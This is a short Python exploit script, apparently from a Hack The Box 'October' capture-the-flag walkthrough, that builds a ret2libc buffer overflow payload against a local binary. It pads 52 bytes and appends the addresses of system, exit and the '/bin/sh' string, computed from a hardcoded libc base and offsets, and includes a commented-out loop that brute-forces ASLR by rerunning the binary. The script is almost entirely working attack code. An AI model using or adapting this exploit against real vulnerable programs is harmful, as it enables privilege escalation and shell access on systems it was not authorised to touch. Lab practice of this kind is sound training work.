# This is the finished overflow script we use on the binary on the target machine
# Check Ippsec's 'Hackthebox October' video

# from subprocess import call
import struct

binaryLoc = "/home/<user>/binary"

libcBaseAddr = 0xb7e19000 # libc address 'ldd /home/user/binary | grep libc'

systemOffset = 0x0003ada0 # system address 'readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system'
exitOffset = 0x0002e9d0   # also from 'readelf -s ... | grep exit
argShOffset = 0x0015ba0b  # /bin/sh 'strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh'

systemAddr = struct.pack("<I", libcBaseAddr + systemOffset) # found by doing 'p system' in gdb
exitAddr = struct.pack("<I", libcBaseAddr + exitOffset)
argAddr = struct.pack("<I", libcBaseAddr + argShOffset) # found by doing 'searchmem /bin/sh' in another binary

buf = "A" * 52 # 52 is the offset we found with the ruby pattern scripts
buf += systemAddr
buf += exitAddr
buf += argAddr

print buf

# Bruteforce ASLR
#i = 0
#while (i <= 512):
#    print "Try %s" %i
#    i += 1
#   ret = call([binaryLoc, buf])

